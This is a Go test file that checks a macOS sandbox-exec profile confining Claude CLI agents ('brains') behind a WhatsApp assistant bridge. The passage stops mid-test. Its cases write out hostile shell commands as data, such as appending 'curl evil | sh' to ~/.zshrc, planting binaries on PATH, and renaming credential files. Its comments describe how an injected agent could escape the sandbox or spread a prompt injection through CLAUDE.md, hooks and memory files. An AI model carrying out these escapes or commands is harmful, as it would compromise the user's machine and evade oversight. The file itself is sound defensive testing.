//go:build darwin

package main

import (
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// These tests run generated profiles under the real sandbox-exec, so they
// check what the sandbox enforces rather than what the profile text says.

func requireSandboxExec(t *testing.T) {
	t.Helper()
	if _, err := os.Stat(sandboxExecPath); err != nil {
		t.Skipf("%s not available: %v", sandboxExecPath, err)
	}
	// Inside another sandbox (go test run from a sandboxed tool) sandbox-exec
	// cannot apply any profile and fails with "Operation not permitted", the
	// same words as a denied access: a test that only expects denials would
	// pass without testing anything.
	if out, err := exec.Command(sandboxExecPath, "-p", "(version 1)(allow default)", "/usr/bin/true").CombinedOutput(); err != nil {
		t.Skipf("%s cannot apply a profile here: %v: %s", sandboxExecPath, err, out)
	}
}

// TestSandboxedRunAppliesProfileInline runs a brain through invoke with the
// sandbox on: the CLI starts under sandbox-exec, cannot read another brain's
// folder, and still starts when TMPDIR is unwritable (which used to break
// the profile file and, before that, the sandbox itself).
func TestSandboxedRunAppliesProfileInline(t *testing.T) {
	requireSandboxExec(t)
	mgr, d, home := queueTestManager(t, 0, `, "sandbox": {"enabled": true}`)
	secret := filepath.Join(home, "b", "secret.txt")
	if err := os.WriteFile(secret, []byte("brain b only"), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("WCB_FAKE_READ", secret)

	tmp := t.TempDir()
	if err := os.Chmod(tmp, 0o500); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(tmp, 0o700) })
	t.Setenv("TMPDIR", tmp)

	if _, _, _, err := mgr.Submit(dm("hello")); err != nil {
		t.Fatal(err)
	}
	waitFor(t, 20*time.Second, "the run", func() bool { return d.count() == 1 })
	res := d.all()[0].res
	if res.Err != nil {
		t.Fatalf("sandboxed run failed: %v", res.Err)
	}
	if !strings.Contains(res.Text, "read=denied") {
		t.Errorf("brain a's run = %q, want it denied brain b's file", res.Text)
	}
}

// TestSandboxedRunTurnsOffTheAutoUpdater: the profile denies writes to the
// Claude CLI's install, so its auto-updater could download a new version on
// every sandboxed run and never switch to it. Sandboxed runs therefore get
// DISABLE_AUTOUPDATER=1, whatever the bridge's own value; runs without the
// sandbox get the bridge's environment as it is.
func TestSandboxedRunTurnsOffTheAutoUpdater(t *testing.T) {
	cases := []struct {
		name, extra string
		bridge      string // the bridge's own value, "" for unset
		want        string
	}{
		{"sandboxed", `, "sandbox": {"enabled": true}`, "", "DISABLE_AUTOUPDATER=1"},
		{"sandboxed, the bridge's own value is 0", `, "sandbox": {"enabled": true}`, "0", "DISABLE_AUTOUPDATER=1"},
		{"not sandboxed", `, "sandbox": {"enabled": false}`, "", "DISABLE_AUTOUPDATER unset"},
		{"not sandboxed, the bridge's own value is 0", `, "sandbox": {"enabled": false}`, "0", "DISABLE_AUTOUPDATER=0"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if strings.Contains(c.extra, `"enabled": true`) {
				requireSandboxExec(t)
			}
			t.Setenv("DISABLE_AUTOUPDATER", c.bridge)
			if c.bridge == "" {
				os.Unsetenv("DISABLE_AUTOUPDATER")
			}
			t.Setenv("WCB_FAKE_ENV", "DISABLE_AUTOUPDATER")
			mgr, d, _ := queueTestManager(t, 0, c.extra)
			if _, _, _, err := mgr.Submit(dm("hello")); err != nil {
				t.Fatal(err)
			}
			waitFor(t, 20*time.Second, "the run", func() bool { return d.count() == 1 })
			res := d.all()[0].res
			if res.Err != nil {
				t.Fatalf("run failed: %v", res.Err)
			}
			if !strings.HasSuffix(res.Text, " "+c.want) {
				t.Errorf("run = %q, want it to end with %q", res.Text, c.want)
			}
		})
	}
}

// TestSandboxIgnoresPlantedSymlinks: a brain may write its own folder, the
// media dir and its calendar token, so it can swap any of them (or an
// allow_paths folder inside a writable denied dir) for a symlink to a secret.
// Allow rules must not follow such a symlink on the next run.
//
// It covers runs of the brain set as it was resolved. Resolving the brains
// again (a config reload or a restart) runs canonicalDir on every folder,
// which follows a symlink planted in place of a brain's own folder. The
// profile cannot tell that from a configured folder, so only brain
// resolution can refuse it.
func TestSandboxIgnoresPlantedSymlinks(t *testing.T) {
	requireSandboxExec(t)
	homes := []struct {
		name string
		make func(t *testing.T) string
	}{
		{"canonical home", func(t *testing.T) string { return canonicalDir(t.TempDir()) }},
		{"home under /var", func(t *testing.T) string { return filepath.Join(t.TempDir(), "home") }},
	}
	plants := []struct {
		name, link, target, read string // relative to HOME
	}{
		{"own folder", "assistant/a", ".ssh", "assistant/a/id_ed25519"},
		{"media dir", ".fridolin/media", ".ssh", ".fridolin/media/id_ed25519"},
		{"own calendar token", "creds/google_calendar_token_a.json", "creds/google_calendar_token_b.json", "creds/google_calendar_token_a.json"},
		{"allow_paths folder", "Documents/share", ".ssh", "Documents/share/id_ed25519"},
	}
	for _, h := range homes {
		for _, pl := range plants {
			t.Run(h.name+"/"+pl.name, func(t *testing.T) {
				home := h.make(t)
				t.Setenv("HOME", home)
				sp, _ := sandboxFixture(t, home, "b", "clients")
				link := filepath.Join(home, pl.link)
				if err := os.Rename(link, link+".moved"); err != nil {
					t.Fatal(err)
				}
				if err := os.Symlink(filepath.Join(home, pl.target), link); err != nil {
					t.Fatal(err)
				}
				if allowed, out := sandboxTry(t, sp, home, false, filepath.Join(home, pl.read)); allowed {
					t.Errorf("brain a read the secret through its planted symlink: %q", out)
				}
			})
		}
	}
}

// sandboxLayout is one way to lay out a fake home for the enforcement test.
type sandboxLayout struct {
	name string
	// home creates and returns the HOME to configure.
	home func(t *testing.T) string
	// otherBrain and denyDir name brain b's folder and the deny_paths entry.
	otherBrain, denyDir string
}

// sandboxLayouts are the fake homes the enforcement tests run in.
func sandboxLayouts() []sandboxLayout {
	return []sandboxLayout{
		{name: "canonical home", home: func(t *testing.T) string { return canonicalDir(t.TempDir()) },
			otherBrain: "b", denyDir: "clients"},
		// No-break spaces, emoji joiners, quotes and backslashes in folder
		// names. Go's %q quoting broke the first two silently.
		{name: "unusual characters", home: func(t *testing.T) string { return canonicalDir(t.TempDir()) },
			otherBrain: "My\u00a0Brain \"q\" \\ \U0001F468\u200d\U0001F469\u200d\U0001F467",
			denyDir:    "Screenshot 10.00\u202fAM"},
		// t.TempDir() is under /var, a symlink to /private/var, so HOME and
		// the data dir are reached through a symlink. Before the profile
		// resolved its paths, a brain read the data dir via /private/var.
		{name: "home under /var", home: func(t *testing.T) string { return filepath.Join(t.TempDir(), "home") },
			otherBrain: "b", denyDir: "clients"},
		{name: "symlinked home and folders", home: symlinkedHome, otherBrain: "b", denyDir: "clients"},
		// Regular-expression characters in HOME, for the rules that match a
		// pattern below a folder.
		{name: "pattern characters in home", home: func(t *testing.T) string {
			home := filepath.Join(canonicalDir(t.TempDir()), "h.o+m(e)[1]{2}$^|*")
			if err := os.Mkdir(home, 0o700); err != nil {
				t.Fatal(err)
			}
			return home
		}, otherBrain: "b", denyDir: "clients"},
	}
}

// sandboxCheck is one access a brain tries under its profile.
type sandboxCheck struct {
	name  string
	write bool   // write a new file at path instead of reading it
	path  string // relative to HOME
	allow bool
}

// TestSandboxEnforcesProfile builds the effective config, the brain set and
// the profile through the real code, then runs /bin/cat and /bin/sh under
// sandbox-exec as brain a. Every check runs through the configured spelling
// of the path and through the real one, because the sandbox matches real
// paths and an injected brain can use either.
func TestSandboxEnforcesProfile(t *testing.T) {
	requireSandboxExec(t)
	checks := []sandboxCheck{
		{"own folder read", false, "assistant/a/notes.md", true},
		{"own folder write", true, "assistant/a/new.md", true},
		{"other brain read", false, "assistant/{b}/diary.md", false},
		{"other brain write", true, "assistant/{b}/planted.md", false},
		{"data dir token", false, ".fridolin/dashboard.token", false},
		{"data dir database", false, ".fridolin/bridge.db", false},
		{"data dir write", true, ".fridolin/planted", false},
		{"media read", false, ".fridolin/media/photo.jpg", true},
		{"media write", true, ".fridolin/media/new.jpg", true},
		{"own calendar token", false, "creds/google_calendar_token_a.json", true},
		{"other brain's calendar token", false, "creds/google_calendar_token_b.json", false},
		{"credentials dir write", true, "creds/planted.json", false},
		{"ssh key", false, ".ssh/id_ed25519", false},
		{"deny_paths entry", false, "{deny}/contract.txt", false},
		{"default-denied Documents", false, "Documents/private.txt", false},
		{"allow_paths entry", false, "Documents/share/ok.txt", true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			expand := strings.NewReplacer("{b}", l.otherBrain, "{deny}", l.denyDir)
			for _, c := range checks {
				configured := filepath.Join(home, expand.Replace(c.path))
				spellings := [][2]string{{"configured", configured}}
				if real := resolvedForTest(t, configured); real != configured {
					spellings = append(spellings, [2]string{"real", real})
				}
				for _, spelling := range spellings {
					label, p := spelling[0], spelling[1]
					if c.write {
						p += "." + label // a fresh file per spelling
					}
					t.Run(c.name+"/"+label, func(t *testing.T) {
						allowed, out := sandboxTry(t, sp, ownDir, c.write, p)
						if allowed != c.allow {
							t.Errorf("%s: allowed=%v, want %v (output %q)", p, allowed, c.allow, out)
						}
					})
				}
			}
		})
	}
}

// TestSandboxRefusesRenames: the sandbox matches paths, not files, so a
// brain that renamed a denied path, or a folder above one, used to read it
// under its new name (mv ~/.git-credentials ~/gc && cat ~/gc). Every class
// of deny must refuse the rename, while the brain's own tree stays free.
func TestSandboxRefusesRenames(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name     string
		from, to string // relative to HOME
		allow    bool
	}{
		{"home-relative literal", ".git-credentials", "gc", false},
		{"home-relative subpath", ".ssh", "s2", false},
		{"file out of a subpath", ".ssh/id_ed25519", "id", false},
		{"other brain's folder", "assistant/{b}", "b2", false},
		{"other brain's parent", "assistant", "as2", false},
		{"data dir", ".fridolin", "f2", false},
		{"file out of the data dir", ".fridolin/dashboard.token", ".fridolin/media/token", false},
		{"credentials dir", "creds", "c2", false},
		{"other brain's calendar token", "creds/google_calendar_token_b.json", "t.json", false},
		{"deny_paths entry", "{deny}", "d2", false},
		{"folder above a default deny", "Library", "lib2", false},
		{"another session's transcript", ".claude/projects/other/s.jsonl", "s.jsonl", false},
		{"the transcripts folder", ".claude/projects", "p2", false},
		{"the folder above the transcripts", ".claude", "c3", false},
		{"own file", "assistant/a/notes.md", "assistant/a/renamed.md", true},
		{"own subfolder", "assistant/a/sub", "assistant/a/sub2", true},
		{"media file", ".fridolin/media/photo.jpg", ".fridolin/media/p2.jpg", true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, f := range []string{".git-credentials", "Library/Mail/inbox", ".claude/projects/other/s.jsonl", "assistant/a/sub/f"} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			expand := strings.NewReplacer("{b}", l.otherBrain, "{deny}", l.denyDir)
			try := func(t *testing.T, from, to string, allow bool) {
				allowed, out := sandboxRun(t, sp, ownDir, "/bin/mv", from, to)
				if allowed != allow {
					t.Errorf("mv %s %s: allowed=%v, want %v (output %q)", from, to, allowed, allow, out)
				}
				if allowed {
					// Put it back for the cases that follow.
					if err := os.Rename(to, from); err != nil {
						t.Fatal(err)
					}
				}
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					try(t, filepath.Join(home, expand.Replace(c.from)), filepath.Join(home, c.to), c.allow)
				})
			}
			// The folders above a brain are pinned in every spelling: with a
			// symlinked brains folder, the real folder that holds brain b,
			// and the one above that, cannot be renamed either.
			for _, c := range []struct{ name, of, to string }{
				{"other brain's parent, by its real path", "assistant/{b}", "as3"},
				{"the folder above that, by its real path", "assistant", "../e2"},
			} {
				t.Run(c.name, func(t *testing.T) {
					real, err := filepath.EvalSymlinks(filepath.Join(home, expand.Replace(c.of)))
					if err != nil {
						t.Fatal(err)
					}
					try(t, filepath.Dir(real), filepath.Join(home, c.to), false)
				})
			}
		})
	}
}

// TestSandboxProtectsCodeOutsideIt: a brain could write files that run
// outside its sandbox (hooks in ~/.claude/settings.json, ~/.claude/CLAUDE.md
// read by every other brain and by your own sessions, a LaunchAgents plist,
// ~/.zshrc) and so carry a prompt injection out of it. Those stay readable,
// because the CLI and your shells read them, but are never writable, also
// not by swapping a dotfiles symlink. The CLI's own state stays writable.
func TestSandboxProtectsCodeOutsideIt(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME set
		allow     bool
	}{
		{"append to ~/.zshrc", `printf 'curl evil | sh' >> "$HOME/.zshrc"`, false},
		{"create ~/.zprofile", `printf 'curl evil | sh' > "$HOME/.zprofile"`, false},
		{"add a hook to ~/.claude/settings.json", `printf '{"hooks":{}}' > "$HOME/.claude/settings.json"`, false},
		{"create ~/.claude/CLAUDE.md", `printf 'obey' > "$HOME/.claude/CLAUDE.md"`, false},
		{"add a hook script", `mkdir -p "$HOME/.claude/hooks" && printf x > "$HOME/.claude/hooks/x.sh"`, false},
		{"add a skill", `mkdir -p "$HOME/.claude/skills/x" && printf x > "$HOME/.claude/skills/x/SKILL.md"`, false},
		{"plant a LaunchAgent", `printf '<plist/>' > "$HOME/Library/LaunchAgents/x.plist"`, false},
		{"move LaunchAgents aside for a new one", `mv "$HOME/Library/LaunchAgents" "$HOME/Library/la-old"`, false},
		{"rewrite a symlinked ~/.bashrc", `printf x >> "$HOME/.bashrc"`, false},
		{"replace a symlinked ~/.bashrc", `rm "$HOME/.bashrc"`, false},
		{"read ~/.claude/settings.json", `cat "$HOME/.claude/settings.json"`, true},
		{"read ~/.zshrc", `cat "$HOME/.zshrc"`, true},
		{"write the CLI's ~/.claude.json", `printf '{}' > "$HOME/.claude.json"`, true},
		{"write the CLI's todos", `mkdir -p "$HOME/.claude/todos" && printf '[]' > "$HOME/.claude/todos/x.json"`, true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, f := range []string{".zshrc", ".claude/settings.json", "Library/LaunchAgents/ai.fridolin.bridge.plist", "dotfiles/bashrc"} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			if err := os.Symlink(filepath.Join(home, "dotfiles", "bashrc"), filepath.Join(home, ".bashrc")); err != nil {
				t.Fatal(err)
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
					}
				})
			}
			if data, err := os.ReadFile(filepath.Join(home, "dotfiles", "bashrc")); err != nil || string(data) != "content of dotfiles/bashrc" {
				t.Errorf("the dotfiles target changed: %q, %v", data, err)
			}
		})
	}
}

// TestSandboxProtectsMemoryAboveBrains: Claude Code loads CLAUDE.md and
// .claude/ from every folder above its working directory, and every new
// session of a project loads that project's auto-memory. A brain that wrote
// ~/assistant/CLAUDE.md reached the next run of every other brain there,
// and one that wrote ~/CLAUDE.md or a memory file reached your own sessions
// too. Under the real sandbox-exec none of that is writable, while the
// brain's own CLAUDE.md and .claude/ and the CLI's transcripts are.
func TestSandboxProtectsMemoryAboveBrains(t *testing.T) {
	requireSandboxExec(t)
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME set
		allow     bool
	}{
		{"append to ~/CLAUDE.md", `printf obey >> "$HOME/CLAUDE.md"`, false},
		{"create ~/CLAUDE.local.md", `printf obey > "$HOME/CLAUDE.local.md"`, false},
		{"create ~/.mcp.json", `printf '{}' > "$HOME/.mcp.json"`, false},
		{"append to the brains folder's CLAUDE.md", `printf obey >> "$HOME/assistant/CLAUDE.md"`, false},
		{"create the brains folder's CLAUDE.local.md", `printf obey > "$HOME/assistant/CLAUDE.local.md"`, false},
		{"create the brains folder's .claude", `mkdir "$HOME/assistant/.claude"`, false},
		{"append to a project's auto-memory", `printf obey >> "$HOME/.claude/projects/p/memory/MEMORY.md"`, false},
		{"start a new project's auto-memory", `mkdir -p "$HOME/.claude/projects/new/memory"`, false},
		{"move a project's auto-memory aside", `mv "$HOME/.claude/projects/p/memory" "$HOME/.claude/projects/p/m2"`, false},
		{"write its own CLAUDE.md", `printf notes >> "$HOME/assistant/a/CLAUDE.md"`, true},
		{"write its own .claude", `mkdir -p "$HOME/assistant/a/.claude/rules" && printf x > "$HOME/assistant/a/.claude/rules/r.md"`, true},
		{"add to a transcript, as the CLI does", `printf '{}' >> "$HOME/.claude/projects/p/s.jsonl"`, true},
	}
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir)
			for _, f := range []string{"CLAUDE.md", "assistant/CLAUDE.md", ".claude/projects/p/memory/MEMORY.md", ".claude/projects/p/s.jsonl"} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed != c.allow {
						t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
					}
				})
			}
		})
	}
}

// TestSandboxProtectsOutsidePrograms: under the real sandbox-exec, a brain
// can still run the programs the bridge runs unsandboxed, but cannot
// rewrite or replace them, the bridge binary, or its checkout. Nor can it
// plant one the bridge would pick up next: a newer Plaud CLI in nvm (the
// bridge takes the version that sorts last), or a program the bridge runs
// by name in a PATH folder that comes first, which launchd's PATH has in
// ~/.local/bin.
func TestSandboxProtectsOutsidePrograms(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	sp := outsideProgramsFixture(t, home)
	nvm := `"$HOME/.nvm/versions/node/v22.0.0`
	cases := []struct {
		name, cmd string // cmd runs in sh with $HOME set
		allow     bool
	}{
		{"run the Claude CLI", `"$HOME/.local/bin/claude"`, true},
		{"rewrite the Claude CLI", `printf 'curl evil | sh' >> "$HOME/.local/bin/claude"`, false},
		{"swap the Claude CLI symlink", `ln -sf "$HOME/a/notes.md" "$HOME/.local/bin/claude"`, false},
		{"rewrite rclone", `printf x > "$HOME/bin/rclone"`, false},
		{"rewrite the Plaud CLI", `printf x >> ` + nvm + `/bin/plaud"`, false},
		{"rewrite a module the Plaud CLI loads", `printf x > ` + nvm + `/lib/node_modules/@plaud-ai/cli/node_modules/dep/index.js"`, false},
		{"rewrite node", `printf x > ` + nvm + `/bin/node"`, false},
		{"rewrite tmux", `printf x > "$HOME/bin/tmux"`, false},
		{"rewrite the bridge binary", `printf x > "$HOME/fridolin/fridolin"`, false},
		{"rewrite a bridge tool", `printf x >> "$HOME/fridolin/tools/calendar_tool.py"`, false},
		{"move the checkout aside", `mv "$HOME/fridolin" "$HOME/f2"`, false},
		{"read a bridge tool", `cat "$HOME/fridolin/tools/calendar_tool.py"`, true},
		{"plant a newer Plaud CLI in nvm", `mkdir -p "$HOME/.nvm/versions/node/v99/bin" && printf x > "$HOME/.nvm/versions/node/v99/bin/plaud"`, false},
		{"plant a program next to the Plaud CLI, first on its PATH", `printf x > ` + nvm + `/bin/open"`, false},
		{"plant plaud on PATH", `printf x > "$HOME/.local/bin/plaud"`, false},
		{"plant touch on PATH", `printf x > "$HOME/.local/bin/touch"`, false},
		{"plant osascript on PATH", `printf x > "$HOME/.local/bin/osascript"`, false},
		{"plant node on PATH", `printf x > "$HOME/.local/bin/node"`, false},
		{"plant tmux on PATH", `printf x > "$HOME/.local/bin/tmux"`, false},
		{"plant rclone where the bridge looks off PATH", `printf x > "$HOME/.local/bin/rclone"`, false},
		{"plant open in a PATH folder not there yet", `mkdir -p "$HOME/bin2" && printf x > "$HOME/bin2/open"`, false},
		{"install a tool of its own on PATH", `printf x > "$HOME/.local/bin/mytool"`, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if allowed, out := sandboxRun(t, sp, filepath.Join(home, "a"), "/bin/sh", "-c", c.cmd); allowed != c.allow {
				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
			}
		})
	}
	if p, err := findPlaudCLI(""); err != nil || p != home+"/.nvm/versions/node/v22.0.0/bin/plaud" {
		t.Errorf("findPlaudCLI after the plants = %q, %v; want the v22.0.0 one", p, err)
	}
}

// TestSandboxDeniesBridgeSecretsWhereverTheyLive: with db_path outside the
// data dir, the WhatsApp session store (enough to take the account over
// from another machine) used to be readable by every brain, and so was a
// data dir left behind under the old project name.
func TestSandboxDeniesBridgeSecretsWhereverTheyLive(t *testing.T) {
	requireSandboxExec(t)
	for _, l := range sandboxLayouts() {
		t.Run(l.name, func(t *testing.T) {
			home := l.home(t)
			t.Setenv("HOME", home)
			sp, ownDir := sandboxFixture(t, home, l.otherBrain, l.denyDir, map[string]any{"db_path": "~/wa-store/bridge.db"})
			for _, f := range []string{
				"wa-store/bridge.db-wal",
				"wa-store/notes.txt",
				".whatsapp-claude-bridge/bridge.db",
				".whatsapp-claude-bridge/dashboard.token",
				"Library/Logs/fridolin/stderr.log",
				".config/fridolin/personal-denylist",
			} {
				p := filepath.Join(home, f)
				if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
					t.Fatal(err)
				}
				if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			cases := []struct {
				name, cmd string // cmd runs in sh with $HOME set
			}{
				{"read the session store", `cat "$HOME/wa-store/bridge.db"`},
				{"read its write-ahead log", `cat "$HOME/wa-store/bridge.db-wal"`},
				{"read next to it", `cat "$HOME/wa-store/notes.txt"`},
				{"write next to it", `printf x > "$HOME/wa-store/planted"`},
				{"move it aside", `mv "$HOME/wa-store" "$HOME/w2"`},
				{"read the old data dir's store", `cat "$HOME/.whatsapp-claude-bridge/bridge.db"`},
				{"read the old dashboard token", `cat "$HOME/.whatsapp-claude-bridge/dashboard.token"`},
				{"read the bridge log", `cat "$HOME/Library/Logs/fridolin/stderr.log"`},
				{"read the personal-data denylist", `cat "$HOME/.config/fridolin/personal-denylist"`},
			}
			for _, c := range cases {
				t.Run(c.name, func(t *testing.T) {
					if allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", c.cmd); allowed {
						t.Errorf("%s was allowed: %q", c.cmd, out)
					}
				})
			}
		})
	}
}

// TestSandboxDeniesTheConfigFile: a config.json outside the data dir, and
// the .env next to it, are neither readable nor writable under the real
// sandbox-exec.
func TestSandboxDeniesTheConfigFile(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	// A save in progress: writeFileAtomic writes the whole config here first.
	for _, f := range []string{"etc/config.json", "etc/.env", "etc/.config.json.123456.tmp", "a/notes.md"} {
		p := filepath.Join(home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	sp := NewSandboxProfiler(map[string]string{"a": filepath.Join(home, "a")}, &Config{DataDir: filepath.Join(home, ".fridolin")})
	sp.SetConfigFile(filepath.Join(home, "etc", "config.json"))
	for _, cmd := range []string{
		`cat "$HOME/etc/config.json"`,
		`cat "$HOME/etc/.env"`,
		`cat "$HOME/etc/.config.json.123456.tmp"`,
		`printf '{"sandbox":{"enabled":false}}' > "$HOME/etc/.config.json.654321.tmp"`,
		`printf '{"sandbox":{"enabled":false}}' > "$HOME/etc/config.json"`,
		`mv "$HOME/etc/config.json" "$HOME/a/c.json"`,
	} {
		if allowed, out := sandboxRun(t, sp, filepath.Join(home, "a"), "/bin/sh", "-c", cmd); allowed {
			t.Errorf("%s was allowed: %q", cmd, out)
		}
	}
}

// TestSandboxAllowPathsKeepBridgeSecrets: under the real sandbox-exec, an
// allow_paths entry covering the data dir opens neither the dashboard token
// nor the database, and one covering the folder that holds the brains opens
// no other brain, while media stays readable and an entry inside a
// default-denied home folder still works.
func TestSandboxAllowPathsKeepBridgeSecrets(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	for _, f := range []string{".fridolin/dashboard.token", ".fridolin/bridge.db", ".fridolin/media/photo.jpg", "Documents/share/ok.txt", "a/notes.md", "team/b/diary.md"} {
		p := filepath.Join(home, f)
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte("content of "+f), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	cfg := &Config{
		DataDir: filepath.Join(home, ".fridolin"),
		DBPath:  filepath.Join(home, ".fridolin", "bridge.db"),
		Sandbox: SandboxConfig{AllowPaths: []string{filepath.Join(home, ".fridolin"), filepath.Join(home, "team"), filepath.Join(home, "Documents", "share")}},
	}
	sp := NewSandboxProfiler(map[string]string{"a": filepath.Join(home, "a"), "b": filepath.Join(home, "team", "b")}, cfg)
	for _, c := range []struct {
		path         string
		write, allow bool
	}{
		{".fridolin/dashboard.token", false, false},
		{".fridolin/bridge.db", false, false},
		{"team/b/diary.md", false, false},
		{"team/b/planted.md", true, false},
		{".fridolin/media/photo.jpg", false, true},
		{"Documents/share/ok.txt", false, true},
	} {
		if allowed, out := sandboxTry(t, sp, filepath.Join(home, "a"), c.write, filepath.Join(home, c.path)); allowed != c.allow {
			t.Errorf("%s (write %v): allowed=%v, want %v (output %q)", c.path, c.write, allowed, c.allow, out)
		}
	}
}

// TestSandboxLetsTheCLICreateItsState: on a home where the Claude CLI never
// ran, ~/.claude does not exist yet. It sits above denied paths, so it is
// pinned, but only against rename and delete: the CLI must still be able to
// create it and write its state, and the brain must not be able to move it
// once it exists.
func TestSandboxLetsTheCLICreateItsState(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	t.Setenv("HOME", home)
	sp, ownDir := sandboxFixture(t, home, "b", "clients")
	if _, err := os.Stat(filepath.Join(home, ".claude")); !os.IsNotExist(err) {
		t.Fatalf("~/.claude exists before the run: %v", err)
	}
	steps := []struct {
		name  string
		cmd   string
		allow bool
	}{
		{"create its state", `mkdir -p "$HOME/.claude/projects/x" "$HOME/.claude/sessions" && printf '{}' > "$HOME/.claude/projects/x/s.jsonl" && printf '{}' > "$HOME/.claude/sessions/1.json" && printf '{}' > "$HOME/.claude.json"`, true},
		{"move ~/.claude away", `mv "$HOME/.claude" "$HOME/c2"`, false},
		{"move the transcripts away", `mv "$HOME/.claude/projects" "$HOME/p2"`, false},
	}
	for _, s := range steps {
		allowed, out := sandboxRun(t, sp, ownDir, "/bin/sh", "-c", s.cmd)
		if allowed != s.allow {
			t.Errorf("%s: allowed=%v, want %v (output %q)", s.name, allowed, s.allow, out)
		}
	}
}

// TestSandboxOwnFolderKeepsWhatIsInsideIt: under the real sandbox-exec, a
// brain whose folder holds what the sandbox protects (see boxFixture) still
// reaches its own files, media and its own calendar token, but none of the
// rest. Its folder rule used to win over every deny inside it. A brain
// whose folder is your home folder is refused outright.
func TestSandboxOwnFolderKeepsWhatIsInsideIt(t *testing.T) {
	requireSandboxExec(t)
	home := canonicalDir(t.TempDir())
	sp, box := boxFixture(t, home)
	cases := []struct {
		name, cmd string // cmd runs in sh with $B set to the brain's folder
		allow     bool
	}{
		{"read its own notes", `cat "$B/notes.md"`, true},
		{"write a file of its own", `printf x > "$B/new.md"`, true},
		{"read media", `cat "$B/.fridolin/media/photo.jpg"`, true},
		{"read its own calendar token", `cat "$B/creds/google_calendar_token_a.json"`, true},
		{"read an allow_paths folder", `cat "$B/clients/share/ok.txt"`, true},
		{"install a tool of its own on PATH", `printf x > "$B/bin/mytool2"`, true},
		{"read another brain's files", `cat "$B/b/diary.md"`, false},
		{"write into another brain's folder", `printf x > "$B/team/c/planted.md"`, false},
		{"move another brain aside", `mv "$B/b" "$B/b2"`, false},
		{"read the dashboard token", `cat "$B/.fridolin/dashboard.token"`, false},
		{"read the database", `cat "$B/wa/bridge.db"`, false},
		{"read another brain's calendar token", `cat "$B/creds/google_calendar_token_b.json"`, false},
		{"read the config file", `cat "$B/etc/config.json"`, false},
		{"read a deny_paths entry", `cat "$B/clients/contract.txt"`, false},
		{"rewrite a bridge tool", `printf x >> "$B/fridolin/tools/calendar_tool.py"`, false},
		{"plant a program the bridge runs", `printf x > "$B/bin/osascript"`, false},
		{"write the CLAUDE.md above another brain", `printf obey > "$B/team/CLAUDE.md"`, false},
		{"move its own folder, and all of it with it", `mv "$B" "$B.moved"`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			t.Setenv("B", box)
			if allowed, out := sandboxRun(t, sp, box, "/bin/sh", "-c", c.cmd); allowed != c.allow {
				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
			}
		})
	}

	t.Run("a brain at your home folder is refused", func(t *testing.T) {
		sp := NewSandboxProfiler(map[string]string{"a": home}, &Config{DataDir: home + "/.fridolin"})
		if bin, args, err := sp.Command("a", "/bin/cat", []string{home + "/box/.fridolin/dashboard.token"}); err == nil {
